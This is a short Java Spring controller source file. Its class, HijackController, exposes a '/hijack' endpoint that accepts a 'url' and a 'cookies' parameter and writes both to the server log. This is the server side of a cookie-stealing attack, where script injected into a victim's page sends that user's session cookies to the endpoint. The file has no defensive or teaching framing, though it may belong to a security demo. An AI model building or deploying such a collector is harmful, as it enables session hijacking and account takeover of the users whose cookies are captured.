package portero.web.controllers;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import static java.lang.String.format;

@Controller
public class HijackController {

    private static Log log = LogFactory.getLog(HijackController.class);

    @RequestMapping("/hijack")
    @ResponseBody
    public void hijack(@RequestParam(value="url", required=false) String url,
                         @RequestParam(value="cookies", required=false) String cookies, Model model) {
        log.error(format("url=%s cookies=%s", url, cookies));
    }
}
